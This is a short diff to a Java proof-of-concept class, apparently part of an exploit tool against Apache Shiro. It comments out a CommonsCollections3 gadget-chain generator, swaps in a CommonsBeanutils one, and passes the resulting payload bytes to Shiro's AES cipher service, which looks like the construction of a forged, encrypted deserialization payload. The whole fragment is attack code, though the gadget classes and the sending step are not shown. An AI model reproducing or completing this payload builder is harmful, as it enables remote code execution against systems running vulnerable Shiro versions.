@@ -5,7 +5,10 @@ import org.apache.shiro.util.ByteSource;
 
 public class POC {
     public static void main(String[] args) throws Exception {
-        CommonsCollections3 cc3 = new CommonsCollections3();
+//        CommonsCollections3 cc3 = new CommonsCollections3();
+//        byte[] temp = cc3.getPOCBytes();
+
+        CommonsBeanutilsPoc cc3 = new CommonsBeanutilsPoc();
         byte[] temp = cc3.getPOCBytes();
 
         AesCipherService aesCipherService = new AesCipherService();
